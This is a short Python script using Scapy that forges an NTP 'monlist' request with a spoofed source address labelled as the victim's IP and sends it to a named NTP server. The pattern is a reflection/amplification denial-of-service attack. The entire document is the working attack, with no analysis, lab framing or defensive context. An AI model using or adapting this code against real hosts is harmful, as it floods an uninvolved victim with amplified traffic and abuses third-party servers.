from scapy.all import *
import random 
# NTP server’s IP
ntp_server_ip = "139.194.13.228" 
# victim’s IP
victim_ip = "192.168.100.206"
# NTP monlist packet payload
data = "\x17\x00\x03\x2a" + "\x00" * 44 
# forge packet
packet = IP(dst=ntp_server_ip, src=victim_ip) / UDP(sport=random.randint(2000,65535), dport=123) / Raw(load=data) 
# send packet
send(packet, loop=0)
